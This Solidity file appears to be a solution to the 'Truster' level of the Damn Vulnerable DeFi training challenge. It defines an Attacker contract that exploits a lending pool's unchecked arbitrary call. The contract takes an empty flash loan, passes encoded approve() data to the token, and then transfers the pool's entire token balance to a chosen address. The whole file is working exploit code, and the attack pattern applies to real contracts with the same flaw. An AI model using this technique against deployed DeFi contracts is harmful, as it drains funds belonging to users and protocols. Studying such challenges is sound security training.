pragma solidity =0.8.25;

import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract Attacker {
    TrusterLenderPool lender;
    address recoveryAddress;
    DamnValuableToken dvt;

    constructor(address _lenderAddress, address _recoveryAddress, address _dvtAddress) {
        lender = TrusterLenderPool(_lenderAddress);
        recoveryAddress = _recoveryAddress;
        dvt = DamnValuableToken(_dvtAddress);
    }

    function attack() external returns (bool) {

        uint256 poolBalance = dvt.balanceOf(address(lender));

        // @dev - execute empty flashloan but add this contract approval to transfer all tokens from lenderPool
        // as the lender pool does not check the address of the contract to call neither the parameters
        require (
            lender.flashLoan(
                0,
                address(this),
                address(dvt),
                abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance)
            )
        );

        // @dev - transfer all tokens from lenderPool to the designated recovery address
        require(dvt.transferFrom(address(lender), recoveryAddress, poolBalance));

        return true;
    }
}